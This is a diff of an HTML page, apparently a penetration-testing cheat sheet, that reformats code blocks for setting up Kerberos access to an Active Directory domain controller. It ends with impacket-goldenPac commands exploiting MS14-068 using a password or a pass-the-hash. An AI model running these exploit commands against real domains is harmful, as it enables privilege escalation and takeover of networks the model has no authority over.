@@ -66,11 +66,9 @@
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install krb5-user cifs-utils
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Add domain controller to `/etc/hosts`</span>
 </span></span><span class="line"><span class="cl">10.10.11.10 example.com dc01.example.com dc01
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`</span>
 </span></span><span class="line"><span class="cl">nameserver 10.10.11.10
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: Edit `/etc/krb5.conf`</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 3: Edit `/etc/krb5.conf`</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> EXAMPLE.COM
@@ -84,13 +82,11 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
 </span></span><span class="line"><span class="cl">    .domain.internal <span class="o">=</span> example.com
 </span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> example.com
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Step 4: Sync time to domain controller</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 4: Sync time to domain controller</span>
 </span></span><span class="line"><span class="cl">ntpdate -s example.com
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate kerberos ticket for user: user</span>
 </span></span><span class="line"><span class="cl">kinit user
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
 </span></span><span class="line"><span class="cl">klist
 </span></span></code></pre></div><br>
 <hr>
@@ -101,8 +97,7 @@
 <h3 id="ms14-068-forged-golden-ticket">MS14-068 (Forged Golden Ticket)</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With creds</span>
 </span></span><span class="line"><span class="cl">impacket-goldenPac <span class="s1">&#39;example.com/user:password@dc01&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># With hash</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With hash</span>
 </span></span><span class="line"><span class="cl">impacket-goldenPac --hashes :hash <span class="s1">&#39;example.com/user@dc01&#39;</span>
 </span></span></code></pre></div><br></div></div>
     
